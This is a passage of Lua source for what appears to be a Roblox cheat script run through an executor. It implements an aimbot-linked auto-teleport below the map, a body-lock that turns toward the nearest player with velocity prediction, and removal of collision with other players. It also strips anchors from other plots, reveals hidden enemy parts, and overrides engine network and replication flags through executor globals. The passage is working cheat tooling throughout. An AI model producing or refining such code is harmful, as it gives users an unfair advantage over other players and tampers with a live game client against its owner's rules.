    return M.bypassAimbotEnabled
end

function M.doAutoTPDown(force)
    -- TP DOWN LOGIC FROM SECOND SOURCE (Anti-Sammy Daily)
    -- Second source: CFrame.new(hrp.Position.X,-7.00,hrp.Position.Z)*CFrame.Angles(0,select(2,hrp.CFrame:ToEulerAnglesYXZ()),0); hrp.Velocity=Vector3.zero
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local hum2 = char:FindFirstChildOfClass("Humanoid")
    if not hum2 then return end

    if not force then
        if hum2.FloorMaterial ~= Enum.Material.Air then return end
        if not (hrp.Position.Y >= (tonumber(M.autoTPHeight) or 20)) then return end
    end
    -- second source teleport: Y=-7.00
    local yaw = select(2, hrp.CFrame:ToEulerAnglesYXZ())
    hrp.CFrame = CFrame.new(hrp.Position.X, -7.00, hrp.Position.Z) * CFrame.Angles(0, yaw, 0)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
    pcall(function() hrp.Velocity = Vector3.zero end)
    pcall(function() hrp.RotVelocity = Vector3.zero end)
end

function M.startAutoTP()
    if M.autoTPConn then task.cancel(M.autoTPConn);M.autoTPConn=nil end
    M.autoTPConn=task.spawn(function() while M.autoTPEnabled do task.wait(0.1);pcall(function() M.doAutoTPDown(false) end) end end)
end

function M.stopAutoTP() M.autoTPEnabled=false;if M.autoTPConn then task.cancel(M.autoTPConn);M.autoTPConn=nil end end

function M.runTPFloor()
    -- second source runTPFloor = doAutoTPDown(true)
    pcall(function() M.doAutoTPDown(true) end)
end

M.mirrorTPPreviousY = M.mirrorTPPreviousY or {}
M.mirrorTPLastTeleport = M.mirrorTPLastTeleport or 0
M.MIRROR_TP_DROP_THRESHOLD = M.MIRROR_TP_DROP_THRESHOLD or 3
M.MIRROR_TP_DOWN_Y = M.MIRROR_TP_DOWN_Y or -7.00

function M.mirrorTPAimbotActive()
    -- Only when Bat Aimbot is on (nothing else)
    return M.autoBatEnabled == true
end

function M.mirrorTPTeleportDown()
    local character = player.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health <= 0 then return end
    local now = tick()
    if now - (M.mirrorTPLastTeleport or 0) < 0.08 then return end
    M.mirrorTPLastTeleport = now
    local _, yaw = root.CFrame:ToEulerAnglesYXZ()
    local y = tonumber(M.MIRROR_TP_DOWN_Y) or -7.00
    root.CFrame = CFrame.new(root.Position.X, y, root.Position.Z) * CFrame.Angles(0, yaw, 0)
    pcall(function() root.Velocity = Vector3.zero end)
    pcall(function() root.AssemblyLinearVelocity = Vector3.zero end)
    pcall(function() root.AssemblyAngularVelocity = Vector3.zero end)
end

if not M._mirrorTPStarted then
    M._mirrorTPStarted = true
    local _mtpAcc = 0
    M._mirrorTPConn = RunService.Heartbeat:Connect(function(dt)
        if not M.mirrorTPDownEnabled then
            if next(M.mirrorTPPreviousY) then table.clear(M.mirrorTPPreviousY) end
            return
        end
        -- Only active while Bat Aimbot is on
        if not (M.autoBatEnabled == true) then
            return
        end
        _mtpAcc = _mtpAcc + (dt or 0.016)
        if _mtpAcc < 0.05 then return end
        _mtpAcc = 0

        local myChar = player.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myRoot then return end

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local currentY = root.Position.Y
                    local previousY = M.mirrorTPPreviousY[plr.UserId]
                    if previousY and previousY - currentY >= (M.MIRROR_TP_DROP_THRESHOLD or 3) then
                        pcall(M.mirrorTPTeleportDown)
                        table.clear(M.mirrorTPPreviousY)
                        return
                    end
                    M.mirrorTPPreviousY[plr.UserId] = currentY
                end
            end
        end
    end)
end

function M.setMirrorTPDown(enabled)
    M.mirrorTPDownEnabled = true -- always on
    table.clear(M.mirrorTPPreviousY)
    if M.setMirrorTPVisual then pcall(function() M.setMirrorTPVisual(true) end) end
    pcall(saveCherryConfig)
end

M.noPlayerCollisionEnabled = false
M.noPlayerCollisionRunning = false
M.noPlayerCollisionState = { connections = {} }

function M.setOtherPlayersCollision(state)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            for _, part in ipairs(plr.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function() part.CanCollide = state end)
                end
            end
        end
    end
end

function M.enableNoPlayerCollision()
    if M.noPlayerCollisionRunning then return end
    M.noPlayerCollisionEnabled = true
    M.noPlayerCollisionRunning = true
    for _, conn in ipairs(M.noPlayerCollisionState.connections or {}) do
        pcall(function() conn:Disconnect() end)
    end
    M.noPlayerCollisionState.connections = {}
    M.setOtherPlayersCollision(false)
    table.insert(M.noPlayerCollisionState.connections, player.CharacterAdded:Connect(function()
        task.wait(0.5)
        if M.noPlayerCollisionEnabled then M.setOtherPlayersCollision(false) end
    end))
    table.insert(M.noPlayerCollisionState.connections, Players.PlayerAdded:Connect(function(plr)
        local c = plr.CharacterAdded:Connect(function()
            task.wait(0.5)
            if M.noPlayerCollisionEnabled then M.setOtherPlayersCollision(false) end
        end)
        table.insert(M.noPlayerCollisionState.connections, c)
    end))
    local _npcAcc = 0
    table.insert(M.noPlayerCollisionState.connections, RunService.Heartbeat:Connect(function(dt)
        if not M.noPlayerCollisionEnabled then return end
        _npcAcc = _npcAcc + (dt or 0)
        if _npcAcc < 0.25 then return end
        _npcAcc = 0
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                for _, part in ipairs(plr.Character:GetDescendants()) do
                    if part:IsA("BasePart") and part.CanCollide == true then
                        pcall(function() part.CanCollide = false end)
                    end
                end
            end
        end
    end))
end

function M.disableNoPlayerCollision()
    if not M.noPlayerCollisionRunning then
        M.noPlayerCollisionEnabled = false
        return
    end
    M.noPlayerCollisionEnabled = false
    M.noPlayerCollisionRunning = false
    for _, conn in ipairs(M.noPlayerCollisionState.connections or {}) do
        pcall(function() conn:Disconnect() end)
    end
    M.noPlayerCollisionState.connections = {}
    M.setOtherPlayersCollision(true)
end

function M.setNoPlayerCollision(on)
    on = on == true
    if on then M.enableNoPlayerCollision() else M.disableNoPlayerCollision() end
    if M.setNoPlayerCollisionVisual then pcall(function() M.setNoPlayerCollisionVisual(on) end) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.setPerfectHit(enabled)
    M.perfectHitEnabled = enabled == true
    M.tpBatSureHitEnabled = M.perfectHitEnabled
    if M.perfectHitEnabled then
        M.tpBatHitMode = "Sure"
    else
        M.tpBatHitMode = "Normal"
    end
    if M.setPerfectHitVisual then pcall(function() M.setPerfectHitVisual(M.perfectHitEnabled) end) end
    if M.setTpBatModeUI then
        pcall(function()
            M.setTpBatModeUI(M.perfectHitEnabled and "Sure Hit" or "Normal Hit")
        end)
    end
    pcall(saveCherryConfig)
end

function M.isSummerBaseName(name)
    if not name then return false end
    local n = tostring(name):lower()

    return n == "summerbase"
        or n == "summer_base"
        or n:find("summerbase", 1, true) ~= nil
        or n:find("summer_base", 1, true) ~= nil
end

function M.isAnchorName(name)
    if not name then return false end
    local n = tostring(name):lower()
    return n == "anchor" or n == "anchors"
end

function M.stripBlockingAnchor(obj)
    if not obj or not obj.Parent then return end
    local key = tostring(obj:GetFullName())
    if M._antiSummerCleaned[key] then return end
    M._antiSummerCleaned[key] = true
    pcall(function()
        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
            obj.CanCollide = false
            obj.CanQuery = false
            obj.CanTouch = false
            obj.Transparency = 1
        end
        obj:Destroy()
    end)
end

function M.cleanSummerBaseAnchors()
    if not M.antiSummerBaseEnabled then return end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return end

    for _, plot in ipairs(plots:GetChildren()) do
        local isSummer = M.isSummerBaseName(plot.Name)
        if not isSummer then
            for _, d in ipairs(plot:GetDescendants()) do
                if M.isSummerBaseName(d.Name) then
                    isSummer = true
                    break
                end
            end
        end
        if not isSummer then continue end

        for _, d in ipairs(plot:GetDescendants()) do
            if M.isAnchorName(d.Name) then
                M.stripBlockingAnchor(d)
            end
        end
    end
end

M._hardHitRing = nil
M._hardHitConn = nil

function M.hideHardHitRing()
    if M._hardHitRing then
        pcall(function() M._hardHitRing:Destroy() end)
        M._hardHitRing = nil
    end
end

function M.showHardHitRing()
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    if M._hardHitRing and M._hardHitRing.Parent then return end
    local cyl = Instance.new("CylinderHandleAdornment")
    cyl.Name = "VynxHardHitRing"
    cyl.Adornee = hrp
    cyl.Color3 = Color3.fromRGB(0, 0, 0)
    cyl.AlwaysOnTop = true
    cyl.ZIndex = 5
    cyl.Transparency = 0.1
    local r = tonumber(M.hardHitRadius) or 10
    cyl.Radius = r
    cyl.InnerRadius = math.max(0.1, r - 0.35)
    cyl.Height = 0.15
    cyl.CFrame = CFrame.new(0, -3, 0)
    cyl.Parent = hrp
    M._hardHitRing = cyl
end

function M.startHardHit()
    M.hardHitEnabled = true
    if M._hardHitConn then return end
    M._hardHitConn = RunService.Heartbeat:Connect(function()
        if not M.hardHitEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        if not M._hardHitRing or not M._hardHitRing.Parent then
            M.showHardHitRing()
        end
        if M._hardHitRing then
            local r = tonumber(M.hardHitRadius) or 10
            M._hardHitRing.Radius = r
            M._hardHitRing.InnerRadius = math.max(0.1, r - 0.35)
            if M._hardHitRing.Adornee ~= root then
                M._hardHitRing.Adornee = root
                M._hardHitRing.Parent = root
            end
        end
    end)
    M.showHardHitRing()
end

function M.stopHardHit()
    M.hardHitEnabled = false
    if M._hardHitConn then
        pcall(function() M._hardHitConn:Disconnect() end)
        M._hardHitConn = nil
    end
    M.hideHardHitRing()
end

function M.enableAntiSummerBase()
    M.antiSummerBaseEnabled = true
    M._antiSummerCleaned = {}
    M.cleanSummerBaseAnchors()
    if M.antiSummerBaseConn then
        pcall(function() M.antiSummerBaseConn:Disconnect() end)
        M.antiSummerBaseConn = nil
    end
    M.antiSummerBaseConn = workspace.DescendantAdded:Connect(function(obj)
        if not M.antiSummerBaseEnabled then return end
        if not M.isAnchorName(obj.Name) then return end
        task.defer(function()
            if not M.antiSummerBaseEnabled or not obj.Parent then return end

            local p = obj
            local underPlots, nearSummer = false, false
            while p and p ~= workspace do
                if p.Name == "Plots" or (p.Parent and p.Parent.Name == "Plots") then underPlots = true end
                if M.isSummerBaseName(p.Name) then nearSummer = true end
                p = p.Parent
            end
            if underPlots and nearSummer then
                M.stripBlockingAnchor(obj)
            end
        end)
    end)
    task.spawn(function()
        while M.antiSummerBaseEnabled do
            M.cleanSummerBaseAnchors()
            task.wait(5)
        end
    end)
end

function M.disableAntiSummerBase()
    M.antiSummerBaseEnabled = false
    if M.antiSummerBaseConn then
        pcall(function() M.antiSummerBaseConn:Disconnect() end)
        M.antiSummerBaseConn = nil
    end
end

function M._isUnderPlots(obj)
    local p = obj
    while p and p ~= workspace do
        if p.Name == "Plots" then return true end
        p = p.Parent
    end
    return false
end

function M._isPlayerCharacterPart(obj)
    if not obj then return false end
    local p = obj
    while p and p ~= workspace do
        if p:IsA("Model") then
            local hum = p:FindFirstChildOfClass("Humanoid")
            if hum then return true end

            if p:FindFirstChild("HumanoidRootPart") then return true end
        end
        p = p.Parent
    end
    return false
end

function M.applyAntiLagDerender(obj)

    pcall(function()
        if obj:IsA("Accessory") or obj:IsA("Hat") then
            obj:Destroy()
        elseif obj:IsA("BasePart") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
            obj.CastShadow = false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            obj.Transparency = 1
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
            or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            obj.Enabled = false
        end
    end)
end


M.bodyLockEnabled = M.bodyLockEnabled == true
M.bodyLockRadius = tonumber(M.bodyLockRadius) or 60
M._bodyLockConn = nil
M._blSuppressCount = M._blSuppressCount or 0
M._blWasEnabled = false
M._blRestoreTimer = nil
M._blSmoothRestore = false

function M.getNearestBodyLockTarget()
    local char = player.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest
end

function M._bodyLockTick()
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local target = M.getNearestBodyLockTarget()
    if not target then
        if not hum.AutoRotate then hum.AutoRotate = true end
        return
    end
    local dist = (target.Position - root.Position).Magnitude
    if dist > (tonumber(M.bodyLockRadius) or 60) then
        if not hum.AutoRotate then hum.AutoRotate = true end
        return
    end
    if hum.AutoRotate then hum.AutoRotate = false end
    local targetVel = target.AssemblyLinearVelocity
    local speed3 = targetVel.Magnitude
    local predictTime = math.clamp(speed3 / 80, 0.08, 0.35)
    local predictedPos = target.Position + targetVel * predictTime
    local targetHead = target.Parent and target.Parent:FindFirstChild("Head")
    local targetHeight = targetHead and targetHead.Position.Y or target.Position.Y
    local myHeight = root.Position.Y + (hum.HipHeight or 0)
    local heightDiff = targetHeight - myHeight
    local verticalCorrection = math.clamp(heightDiff * 0.15, -1.5, 1.5)
    local flatTarget = Vector3.new(predictedPos.X, root.Position.Y + verticalCorrection, predictedPos.Z)
    local toPredict = flatTarget - root.Position
    if toPredict.Magnitude > 0.1 then
        local goalCF = CFrame.lookAt(root.Position, flatTarget)
        local diffCF = root.CFrame:Inverse() * goalCF
        local _, ry, _ = diffCF:ToEulerAnglesXYZ()
        ry = math.clamp(ry, -2.5, 2.5)
        root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(0, ry * 42, 0))
    end
end

function M.startBodyLock()
    if M._bodyLockConn then pcall(function() M._bodyLockConn:Disconnect() end) end
    M.bodyLockEnabled = true
    M._bodyLockConn = RunService.RenderStepped:Connect(function()
        if not M.bodyLockEnabled then return end
        if (M._blSuppressCount or 0) > 0 then return end
        M._bodyLockTick()
    end)
end

function M.stopBodyLock()
    M.bodyLockEnabled = false
    if M._bodyLockConn then pcall(function() M._bodyLockConn:Disconnect() end); M._bodyLockConn = nil end
    local c = player.Character
    local root = c and c:FindFirstChild("HumanoidRootPart")
    if root then
        root.AssemblyAngularVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, -0.1, root.AssemblyLinearVelocity.Z)
    end
    local hum2 = c and c:FindFirstChildOfClass("Humanoid")
    if hum2 then hum2.AutoRotate = true end
end

function M._suppressBodyLock()
    M._blSuppressCount = (M._blSuppressCount or 0) + 1
    if M._blSuppressCount == 1 and M.bodyLockEnabled then
        M._blWasEnabled = true
        M.stopBodyLock()
        M.bodyLockEnabled = true
        if M.setBodyLockVisual then pcall(function() M.setBodyLockVisual(false) end) end
        if M._blRestoreTimer then pcall(function() task.cancel(M._blRestoreTimer) end); M._blRestoreTimer = nil end
        M._blSmoothRestore = false
    end
end

function M._unsuppressBodyLock(delayed)
    if (M._blSuppressCount or 0) > 0 then M._blSuppressCount = M._blSuppressCount - 1 end
    if (M._blSuppressCount or 0) == 0 and M._blWasEnabled then
        M._blWasEnabled = false
        local function restore()
            if M.bodyLockEnabled then
                M._blSmoothRestore = true
                M.startBodyLock()
                if M.setBodyLockVisual then pcall(function() M.setBodyLockVisual(true) end) end
                task.delay(0.5, function() M._blSmoothRestore = false end)
            end
            M._blRestoreTimer = nil
        end
        if delayed then
            M._blRestoreTimer = task.delay(1, restore)
        else
            restore()
        end
    end
end

function M.setBodyLock(on)
    M.bodyLockEnabled = on == true
    if M.bodyLockEnabled then
        if (M._blSuppressCount or 0) == 0 then M.startBodyLock() end
    else
        M.stopBodyLock()
    end
    if M.setBodyLockVisual then
        pcall(function() M.setBodyLockVisual(M.bodyLockEnabled) end)
    end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

if not M._bodyLockCharHooked then
    M._bodyLockCharHooked = true
    player.CharacterAdded:Connect(function()
        if M.bodyLockEnabled then
            task.wait(0.3)
            M.stopBodyLock()
            M.bodyLockEnabled = true
            if (M._blSuppressCount or 0) == 0 then M.startBodyLock() end
        end
    end)
end

M.nukeOptimizerEnabled = M.nukeOptimizerEnabled == true
M._nukeOn = false
M._nukeConns = {}
M._nukeThreads = {}

function M.enableNukeOptimizer()
    if M._nukeOn then return end
    M._nukeOn = true
    M.nukeOptimizerEnabled = true
    pcall(function() if M.enableAntiLag then M.enableAntiLag() end end)

    local MaterialService = game:GetService("MaterialService")
    local XMin, XMax = -560, -240
    local ClothingClasses = {
        "Shirt","Pants","ShirtGraphic","Accessory","Hat","HairAccessory","FaceAccessory",
        "NeckAccessory","ShoulderAccessory","FrontAccessory","BackAccessory","WaistAccessory"
    }
    local BASE_NAMES = {"baseplate","spawnlocation","spawn location","spawn"}

    local function SafeDestroy(obj)
        if obj and obj.Name == "Overhead" then return end
        pcall(function() obj:Destroy() end)
    end
    local function IsClothing(obj)
        for _, className in ipairs(ClothingClasses) do
            if obj:IsA(className) then return true end
        end
        return false
    end
    local function IsCharacterPart(obj)
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and obj:IsDescendantOf(plr.Character) then return true end
        end
        return false
    end
    local function IsOutOfRange(obj)
        if obj:IsA("BasePart") then
            local x = obj.Position.X
            return x < XMin or x > XMax
        end
        return false
    end
    local function IsBase(obj)
        if not obj:IsA("BasePart") then return false end
        local nl = string.lower(obj.Name)
        for _, n in ipairs(BASE_NAMES) do
            if string.find(nl, n, 1, true) then return true end
        end
        return false
    end
    local function IsInBase(obj)
        local p = obj.Parent
        while p and p ~= workspace do
            if IsBase(p) then return true end
            p = p.Parent
        end
        return false
    end
    local function MakeTransparent(obj)
        pcall(function()
            if IsBase(obj) and not IsCharacterPart(obj) then
                obj.Transparency = 1
                obj.CastShadow = false
            end
        end)
    end
    local function StripObject(obj)
        pcall(function()
            if obj:IsA("Texture") or obj:IsA("Decal") or obj:IsA("SpecialMesh") then
                SafeDestroy(obj)
            elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
                or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                pcall(function() obj.Enabled = false end)
                SafeDestroy(obj)
            elseif obj:IsA("SurfaceAppearance") then
                SafeDestroy(obj)
            elseif obj:IsA("BasePart") then
                obj.CastShadow = false
                obj.Material = Enum.Material.Plastic
                pcall(function() obj.MaterialVariant = "" end)
                obj.Reflectance = 0
            end
        end)
    end
    local function CleanObject(obj)
        pcall(function()
            if obj:IsA("SurfaceAppearance") then
                SafeDestroy(obj)
            elseif obj:IsA("Decal") or obj:IsA("Texture") then
                if not (obj.Name == "face" and obj.Parent and obj.Parent.Name == "Head") then
                    SafeDestroy(obj)
                end
            elseif obj:IsA("SpecialMesh") then
                obj.TextureId = ""
            elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
                or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                pcall(function() obj.Enabled = false end)
                SafeDestroy(obj)
            end
        end)
    end
    local function OptimizeLighting()
        pcall(function()
            for _, child in ipairs(Lighting:GetChildren()) do
                if child:IsA("Atmosphere") or child:IsA("Clouds") or child:IsA("PostEffect")
                    or child:IsA("BloomEffect") or child:IsA("BlurEffect")
                    or child:IsA("SunRaysEffect") or child:IsA("DepthOfFieldEffect")
                    or child:IsA("ColorCorrectionEffect") then
                    SafeDestroy(child)
                end
            end
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 100000
            Lighting.Brightness = 2
        end)
    end
    local function ApplyTerrain()
        pcall(function()
            local terrain = workspace:FindFirstChildOfClass("Terrain")
            if terrain then
                for _, c in ipairs(terrain:GetChildren()) do
                    if c:IsA("Clouds") then SafeDestroy(c) end
                end
            end
        end)
    end
    local function OptimizeCharacter(char)
        if not char then return end
        task.defer(function()
            for _, obj in ipairs(char:GetDescendants()) do
                if IsClothing(obj) then SafeDestroy(obj) end
            end
        end)
    end

    table.insert(M._nukeThreads, task.spawn(function()
        pcall(function() if setfpscap then setfpscap(240) end end)
        OptimizeLighting()
        ApplyTerrain()
        for _, obj in ipairs(workspace:GetDescendants()) do
            if not M._nukeOn then return end
            if IsBase(obj) then
                MakeTransparent(obj)
            elseif IsClothing(obj) then
                SafeDestroy(obj)
            elseif IsInBase(obj) then
            elseif IsCharacterPart(obj) then
            elseif IsOutOfRange(obj) then
                SafeDestroy(obj)
            else
                CleanObject(obj)
                StripObject(obj)
            end
        end
        for _, obj in ipairs(workspace:GetDescendants()) do MakeTransparent(obj) end
    end))

    table.insert(M._nukeConns, workspace.DescendantAdded:Connect(function(obj)
        if not M._nukeOn then return end
        task.defer(function()
            if not M._nukeOn then return end
            if IsBase(obj) then MakeTransparent(obj); return end
            if IsClothing(obj) then
                SafeDestroy(obj)
            elseif IsInBase(obj) then
            elseif IsCharacterPart(obj) then
            elseif IsOutOfRange(obj) then
                SafeDestroy(obj)
            else
                CleanObject(obj)
                StripObject(obj)
            end
        end)
    end))
    table.insert(M._nukeConns, Lighting.DescendantAdded:Connect(function(obj)
        if not M._nukeOn then return end
        if obj:IsA("Atmosphere") or obj:IsA("Clouds") or obj:IsA("PostEffect") then
            SafeDestroy(obj)
        end
    end))
    pcall(function()
        table.insert(M._nukeConns, MaterialService.DescendantAdded:Connect(function(obj)
            if not M._nukeOn then return end
            SafeDestroy(obj)
        end))
    end)
    for _, plr in ipairs(Players:GetPlayers()) do
        OptimizeCharacter(plr.Character)
        table.insert(M._nukeConns, plr.CharacterAdded:Connect(OptimizeCharacter))
    end
    table.insert(M._nukeConns, Players.PlayerAdded:Connect(function(plr)
        table.insert(M._nukeConns, plr.CharacterAdded:Connect(OptimizeCharacter))
    end))
    table.insert(M._nukeThreads, task.spawn(function()
        while M._nukeOn do
            task.wait(3)
            pcall(function() if setfpscap then setfpscap(240) end end)
        end
    end))
    table.insert(M._nukeThreads, task.spawn(function()
        while M._nukeOn do
            task.wait(15)
            pcall(function() collectgarbage("collect") end)
        end
    end))
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.disableNukeOptimizer()
    M._nukeOn = false
    M.nukeOptimizerEnabled = false
    for _, c in ipairs(M._nukeConns) do pcall(function() c:Disconnect() end) end
    M._nukeConns = {}
    for _, t in ipairs(M._nukeThreads) do pcall(function() task.cancel(t) end) end
    M._nukeThreads = {}
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.setNukeOptimizer(on)
    if on then M.enableNukeOptimizer() else M.disableNukeOptimizer() end
    if M.setNukeOptimizerVisual then
        pcall(function() M.setNukeOptimizerVisual(M.nukeOptimizerEnabled) end)
    end
end

function M.ensureEnemyVisibility()
    local partNames = {
        "Head", "Torso", "UpperTorso", "LowerTorso",
        "Left Arm", "Right Arm", "Left Leg", "Right Leg",
        "LeftUpperArm", "LeftLowerArm", "LeftHand",
        "RightUpperArm", "RightLowerArm", "RightHand",
        "LeftUpperLeg", "LeftLowerLeg", "LeftFoot",
        "RightUpperLeg", "RightLowerLeg", "RightFoot",
    }
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            local char = plr.Character
            if char then
                for i = 1, #partNames do
                    local d = char:FindFirstChild(partNames[i])
                    if d and (d:IsA("BasePart") or d:IsA("MeshPart")) then
                        if d.Transparency >= 0.99 then
                            d.Transparency = 0
                        end
                        pcall(function() d.LocalTransparencyModifier = 0 end)
                    end
                end
                local head = char:FindFirstChild("Head")
                if head then
                    local face = head:FindFirstChild("face") or head:FindFirstChild("Face")
                    if face and face:IsA("Decal") and face.Transparency >= 1 then
                        face.Transparency = 0
                    end
                end
                if M.playerESPEnabled and M.addESP then
                    if not M.espList or not M.espList[plr] then
                        pcall(function() M.addESP(plr) end)
                    end
                end
            end
        end
    end
end

function M.enableAntiLag()

    if M._antiLagRunning then return end
    M._antiLagRunning = true
    M.removeAccessoriesEnabled = true
    M.antiLagEnabled = true
    M.defLightBrightness = M.defLightBrightness or Lighting.Brightness
    M.defLightClock = M.defLightClock or Lighting.ClockTime
    M.defLightAmbient = M.defLightAmbient or Lighting.OutdoorAmbient
    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 1e10
        Lighting.Brightness = 1
        pcall(function() Lighting.EnvironmentDiffuseScale = 0 end)
        pcall(function() Lighting.EnvironmentSpecularScale = 0 end)
        for _, e in pairs(Lighting:GetChildren()) do
            pcall(function()

                if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
                    or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                    e.Enabled = false
                end
            end)
        end
    end)

    task.spawn(function()
        local list = workspace:GetDescendants()
        local batch = 120
        for i = 1, #list do
            if not M.antiLagEnabled then break end
            pcall(M.applyAntiLagDerender, list[i])
            if i % batch == 0 then task.wait() end
        end
        M._antiLagRunning = false
    end)
    if M.antiLagDescConn then pcall(function() M.antiLagDescConn:Disconnect() end) end
    M.antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
        if M.antiLagEnabled or M.removeAccessoriesEnabled then
            task.defer(function()
                if M.antiLagEnabled or M.removeAccessoriesEnabled then
                    M.applyAntiLagDerender(obj)
                end
            end)
        end
    end)
end

function M.disableAntiLag()
    M.removeAccessoriesEnabled = false
    M.antiLagEnabled = false
    M._antiLagRunning = false
    if M.antiLagDescConn then
        M.antiLagDescConn:Disconnect()
        M.antiLagDescConn = nil
    end
    pcall(function()
        if M.defLightBrightness then Lighting.Brightness = M.defLightBrightness end
        if M.defLightClock then Lighting.ClockTime = M.defLightClock end
        if M.defLightAmbient then Lighting.OutdoorAmbient = M.defLightAmbient end
        Lighting.ExposureCompensation = 0
    end)
end

function M.enableFpsBoost()
    M.fpsBoostEnabled = true
    if M._stretchRezConn then pcall(function() M._stretchRezConn:Disconnect() end); M._stretchRezConn = nil end
    M._stretchRezConn = RunService.RenderStepped:Connect(function()
        if not M.fpsBoostEnabled then return end
        local cam = workspace.CurrentCamera
        if cam and not M.wideViewEnabled then
            -- Stretch FOV style boost (does not override explicit FOV picker when wide view off)
            pcall(function()
                if tonumber(M.fovValue) and tonumber(M.fovValue) >= 100 then
                    cam.FieldOfView = tonumber(M.fovValue)
                else
                    cam.FieldOfView = 120
                end
            end)
        end
    end)
    if M.setFpsBoostVisual then pcall(function() M.setFpsBoostVisual(true) end) end
end

function M.disableFpsBoost()
    M.fpsBoostEnabled = false
    if M._stretchRezConn then pcall(function() M._stretchRezConn:Disconnect() end); M._stretchRezConn = nil end
    pcall(function()
        local cam = workspace.CurrentCamera
        if cam then cam.FieldOfView = tonumber(M.fovValue) or 90 end
    end)
    if M.setFpsBoostVisual then pcall(function() M.setFpsBoostVisual(false) end) end
end

function M.setFpsBoost(on)
    if on then M.enableFpsBoost() else M.disableFpsBoost() end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

M.dawgOptimizerEnabled = false
M._dawgOn = false
M._dawgConns = {}
M._dawgFlagSet = 0
M._dawgFlagDead = 0

local function _dawgApplyFlag(name, value)
    local setF = rawget(getgenv and getgenv() or _G, "setfflag") or rawget(_G, "set_fflag")
    local getF = rawget(getgenv and getgenv() or _G, "getfflag") or rawget(_G, "get_fflag")
    if type(setF) ~= "function" then return false end
    if type(getF) == "function" then
        local ok, cur = pcall(getF, name)
        if not ok or cur == nil then
            M._dawgFlagDead = (M._dawgFlagDead or 0) + 1
            return false
        end
    end
    if pcall(setF, name, tostring(value)) then
        M._dawgFlagSet = (M._dawgFlagSet or 0) + 1
        return true
    end
    return false
end

local DAWG_FLAGS = {
    { "DFIntClusterSenderMaxJoinBandwidthBps", "2100000000" },
    { "DFIntClusterSenderMaxUpdateBandwidthBps", "2100000000" },
    { "DFIntServerFramesBetweenJoins", "1" },
    { "DFIntRaknetBandwidthInfluxHundredthsPercentageV2", "10000" },
    { "DFIntConnectionMTUSize", "1400" },
    { "FIntRakNetResendBufferArrayLength", "1024" },
    { "DFIntRakNetNakResendDelayMsMax", "1" },
    { "DFIntWaitOnUpdateNetworkLoopEndedMS", "100" },
    { "DFIntWaitOnRecvFromLoopEndedMS", "100" },
    { "DFIntLargePacketQueueSizeCutoffMB", "1000" },
    { "DFIntSendRakNetStatsInterval", "2147483647" },
    { "DFIntRakNetLoopMs", "1" },
    { "DFIntRakNetSelectTimeoutMs", "1" },
    { "DFIntNetworkClusterPacketCacheNumParallelTasks", "8" },
    { "DFIntReplicationDataCacheNumParallelTasks", "8" },
    { "DFIntMegaReplicatorNumParallelTasks", "16" },
    { "DFIntMegaReplicatorNetworkQualityProcessorUnit", "10" },
    { "DFIntMaxProcessPacketsStepsPerCyclic", "512" },
    { "DFIntMaxProcessPacketsStepsAccumulated", "0" },
    { "DFIntMaxProcessPacketsJobScaling", "1000" },
    { "DFIntClientPacketMaxFrameMicroseconds", "200000" },
    { "DFIntClientPacketExcessMicroseconds", "10000" },
    { "DFIntClientPacketMinMicroseconds", "1" },
